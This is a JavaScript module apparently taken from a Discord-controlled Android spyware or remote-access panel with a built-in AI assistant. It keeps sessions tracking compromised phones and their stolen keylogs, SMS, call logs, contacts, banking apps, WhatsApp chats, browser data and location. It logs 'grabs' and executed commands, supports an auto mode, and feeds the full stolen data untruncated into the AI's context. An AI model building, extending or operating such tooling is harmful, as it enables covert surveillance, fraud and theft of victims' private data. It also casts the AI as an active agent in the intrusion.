export class AIContext {
  constructor() {
    this.sessions = new Map()
  }

  getSession(guildId, userId) {
    const guildSessions = this.sessions.get(guildId)
    if (!guildSessions) return null
    return guildSessions.get(userId) || null
  }

  createSession(guildId, userId) {
    if (!this.sessions.has(guildId)) this.sessions.set(guildId, new Map())
    const session = {
      userId,
      guildId,
      active: true,
      currentTarget: null,
      deviceKnowledge: new Map(),
      conversationHistory: [],
      pendingProposal: null,
      grabHistory: [],
      executedCommands: new Set(),
      autoMode: false,
      createdAt: Date.now(),
      lastActivity: Date.now(),
    }
    this.sessions.get(guildId).set(userId, session)
    return session
  }

  deleteSession(guildId, userId) {
    const guildSessions = this.sessions.get(guildId)
    if (guildSessions) guildSessions.delete(userId)
  }

  updateDeviceKnowledge(session, chId, key, value) {
    if (!session.deviceKnowledge.has(chId)) {
      session.deviceKnowledge.set(chId, {
        model: '?', android: '?', ip: '?', owner: null,
        contacts: [], apps: [], location: null, lastSeen: null,
        keylog: [], sms: [], callLog: [], wifi: [],
        banks: [], whatsapp: [], chrome: [], docs: [], notes: [],
      })
    }
    const device = session.deviceKnowledge.get(chId)
    device[key] = value
    device.lastSeen = Date.now()
    session.lastActivity = Date.now()
  }

  markCommandExecuted(session, command, args) {
    session.executedCommands.add(`${command}|${args || ''}`)
    session.lastActivity = Date.now()
  }

  wasCommandExecuted(session, command, args) {
    return session.executedCommands.has(`${command}|${args || ''}`)
  }

  getUnexecutedCommands(session, commands) {
    return commands.filter(c => !session.executedCommands.has(`${c.command}|${c.args || ''}`))
  }

  addGrabRecord(session, chId, grabType, summary) {
    if (!session.grabHistory) session.grabHistory = []
    session.grabHistory.push({ chId, type: grabType, summary: summary.slice(0, 200), timestamp: Date.now() })
    session.lastActivity = Date.now()
  }

  getGrabHistory(session, chId = null) {
    if (!session.grabHistory) return []
    if (chId) return session.grabHistory.filter(g => g.chId === chId)
    return session.grabHistory
  }

  addToHistory(session, role, content) {
    session.conversationHistory.push({ role, content, timestamp: Date.now() })
    if (session.conversationHistory.length > 30) session.conversationHistory.shift()
    session.lastActivity = Date.now()
  }

  setPendingProposal(session, proposal) {
    session.pendingProposal = proposal
    session.lastActivity = Date.now()
  }

  clearPendingProposal(session) {
    session.pendingProposal = null
  }

  summarizeDeviceKnowledge(session) {
    const summary = []
    for (const [chId, dev] of session.deviceKnowledge) {
      const name = dev.model !== '?' ? dev.model : chId.replace(/^device-/, '')
      summary.push(`Device: ${name} (${chId})`)
      if (dev.owner) summary.push(`  Owner: ${dev.owner}`)
      if (dev.location) summary.push(`  Location: ${dev.location}`)
      summary.push(`  Contacts: ${dev.contacts.length}`)
      summary.push(`  Apps: ${dev.apps.length}`)
      summary.push(`  Banks: ${dev.banks.length}`)
      summary.push(`  WhatsApp chats: ${dev.whatsapp.length}`)
      summary.push(`  SMS: ${dev.sms.length} messages`)
      summary.push(`  IP: ${dev.ip}`)
      summary.push(`  Last seen: ${dev.lastSeen ? new Date(dev.lastSeen).toISOString() : 'never'}`)

      // Include raw command response data — full content, no truncation
      const rawFields = ['ip', 'sysinfo', 'installed', 'contacts', 'sms', 'call_log', 'wifi', 'location', 'clipboard', 'keylog', 'notifications', 'shell', 'installed_packages']
      for (const field of rawFields) {
        const val = dev[field]
        if (val && typeof val === 'string' && val.length > 3 && val !== '[]' && val !== '{}') {
          summary.push(`  ${field.toUpperCase()}: ${val}`)
        }
      }

      // Include any last_* command results
      for (const [key, val] of Object.entries(dev)) {
        if (key.startsWith('last_') && typeof val === 'string' && val.length > 5) {
          summary.push(`  ${key.replace('last_', '').toUpperCase()}: ${val}`)
        }
      }

      // Include executed commands log
      const executed = [...session.executedCommands].filter(e => e.includes(chId) || !e.includes('device-'))
      if (executed.length > 0) {
        summary.push(`  Executed commands: ${executed.map(e => e.split('|')[0]).join(', ')}`)
      }

      const grabs = this.getGrabHistory(session, chId)
      if (grabs.length > 0) {
        summary.push(`  Grabs: ${grabs.length} total`)
        for (const g of grabs.slice(-5)) {
          summary.push(`    • ${g.type} at ${new Date(g.timestamp).toLocaleTimeString()}`)
        }
      }
    }
    return summary.join('\n')
  }

  clearHallucinatedData(session) {
    for (const [, dev] of session.deviceKnowledge) {
      if (dev.owner && !dev.last_contacts && !dev.contacts?.length) dev.owner = null
    }
    const hallucinatedPatterns = [
      /(?:appears to be|identified as|named|called) \w+ \w+,? (?:a|an) \d+/i,
      /(?:32-year-old|28-year-old|45-year-old|35-year-old)/i,
    ]
    session.conversationHistory = session.conversationHistory.filter(entry => {
      if (entry.role === 'assistant') {
        for (const pat of hallucinatedPatterns) {
          if (pat.test(entry.content)) return false
        }
      }
      return true
    })
  }

  cleanup(maxAgeMs = 3600000) {
    const now = Date.now()
    for (const [guildId, guildSessions] of this.sessions) {
      for (const [userId, session] of guildSessions) {
        if (now - session.lastActivity > maxAgeMs) guildSessions.delete(userId)
      }
      if (guildSessions.size === 0) this.sessions.delete(guildId)
    }
  }

  getStats() {
    let total = 0
    for (const guildSessions of this.sessions.values()) total += guildSessions.size
    return { sessions: total, guilds: this.sessions.size }
  }
}

export const aiContext = new AIContext()
